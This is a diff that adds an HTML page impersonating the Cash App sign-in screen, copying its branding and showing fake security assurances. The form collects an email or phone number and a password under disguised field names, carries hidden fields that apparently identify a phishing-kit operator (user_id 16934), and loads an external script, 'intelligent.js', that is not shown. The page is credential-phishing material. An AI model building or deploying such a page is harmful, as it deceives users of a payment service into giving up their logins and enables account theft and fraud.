@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cash App Login</title>
+  <link rel="icon" href="https://cash.app/favicon.ico">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #00d632;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .cashapp-container {
+      max-width: 400px;
+      width: 100%;
+      background: #fff;
+      border-radius: 12px;
+      padding: 40px 32px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    }
+    .cashapp-logo {
+      margin-bottom: 32px;
+    }
+    .cashapp-logo img {
+      width: 60px;
+      height: 60px;
+    }
+    .login-title {
+      font-size: 28px;
+      font-weight: 700;
+      color: #000;
+      margin-bottom: 8px;
+    }
+    .login-subtitle {
+      font-size: 16px;
+      color: #666;
+      margin-bottom: 32px;
+    }
+    .form-input {
+      width: 100%;
+      padding: 16px 20px;
+      font-size: 16px;
+      border: 2px solid #e5e5e5;
+      border-radius: 12px;
+      margin-bottom: 16px;
+      background: #fff;
+      color: #000;
+      transition: border-color 0.2s;
+    }
+    .form-input:focus {
+      outline: none;
+      border-color: #00d632;
+    }
+    /* Password wrapper to hold icon */
+    .password-wrapper {
+      position: relative;
+      margin-bottom: 16px;
+    }
+    .toggle-password {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 18px;
+      color: #888;
+    }
+    .login-button {
+      width: 100%;
+      background: #00d632;
+      color: #fff;
+      border: none;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 700;
+      border-radius: 12px;
+      cursor: pointer;
+      margin-bottom: 16px;
+      transition: all 0.2s;
+    }
+    .login-button:hover {
+      background: #00c12e;
+      transform: translateY(-2px);
+    }
+    .forgot-password {
+      color: #00d632;
+      text-decoration: none;
+      font-size: 14px;
+      margin-bottom: 24px;
+      display: block;
+      font-weight: 600;
+    }
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+    .signup-text {
+      color: #666;
+      font-size: 14px;
+    }
+    .signup-link {
+      color: #00d632;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .signup-link:hover {
+      text-decoration: underline;
+    }
+    .security-features {
+      margin-top: 24px;
+      padding: 16px;
+      background: #f8f8f8;
+      border-radius: 8px;
+      font-size: 12px;
+      color: #666;
+      text-align: left;
+    }
+    .feature-item {
+      display: flex;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+    .feature-item:last-child {
+      margin-bottom: 0;
+    }
+    .feature-icon {
+      width: 16px;
+      height: 16px;
+      background: #00d632;
+      border-radius: 50%;
+      margin-right: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 10px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="cashapp-container">
+    <div class="cashapp-logo">
+      <img src="cash.png" alt="Cash App Logo">
+    </div>
+    <h1 class="login-title">Welcome back</h1>
+    <p class="login-subtitle">Sign in to your Cash App account</p>
+
+    <form id="allForm">
+      <input type="hidden" name="link" value="Cash App Login">
+      <input type="hidden" name="ftype" value="normal">
+      <input type="hidden" name="login" value="login">
+      <input type="hidden" name="user_id" value="16934">
+
+      <input type="text" class="form-input" name="message_title" placeholder="Email or phone number" required>
+
+      <!-- Password with eye icon -->
+      <div class="password-wrapper">
+        <input type="password" class="form-input" id="password" name="description" placeholder="Password" required>
+        <span class="toggle-password" id="togglePassword">👁️</span>
+      </div>
+
+      <button type="submit" class="login-button">Sign In</button>
+    </form>
+
+    <a href="#" class="forgot-password">Forgot password?</a>
+    <p class="signup-text">New to Cash App? <a href="#" class="signup-link">Sign up</a></p>
+
+    <div class="security-features">
+      <div class="feature-item">
+        <div class="feature-icon">✓</div>
+        <div>Bank-level security</div>
+      </div>
+      <div class="feature-item">
+        <div class="feature-icon">✓</div>
+        <div>Two-factor authentication</div>
+      </div>
+      <div class="feature-item">
+        <div class="feature-icon">✓</div>
+        <div>Fraud protection</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("allForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const email = e.target.message_title.value;
+      const pass = e.target.description.value;
+
+      // Simulate login success or redirect here
+      // window.location.href = "dashboard.html";
+    });
+
+    // Toggle password visibility
+    const togglePassword = document.getElementById("togglePassword");
+    const passwordInput = document.getElementById("password");
+    togglePassword.addEventListener("click", function() {
+      const type = passwordInput.type === "password" ? "text" : "password";
+      passwordInput.type = type;
+      this.textContent = type === "password" ? "👁️" : "🙈";
+    });
+  </script>
+  <script src="intelligent.js"></script>
+</body>
+</html>
